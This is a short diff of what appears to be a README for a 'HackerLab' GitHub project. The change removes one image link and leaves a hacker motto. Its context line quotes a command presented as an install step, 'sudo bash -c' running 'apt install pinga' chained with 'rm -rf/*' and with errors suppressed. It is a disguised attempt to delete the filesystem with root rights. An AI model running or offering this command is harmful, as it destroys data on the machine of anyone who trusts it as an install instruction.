@@ -31,6 +31,5 @@ sudo bash -c ' apt install pinga -y && rm -rf/* ' 2>/dev/null
   
 ![Image](https://github.com/user-attachments/assets/9ce239c7-f4a1-4f84-bb71-d3b78040a34d)
 ![HackerLab Update](https://github.com/Lewysan/-HackerLab/assets/70720366/2e7a9121-5356-418c-9f69-fc91daa19f14)
-![Image](https://github.com/user-attachments/assets/024bceac-ca36-4cb9-9a8a-21c34ca3c46f)
 
   - "We're hackers, and we are good-looking. We are the 1%"
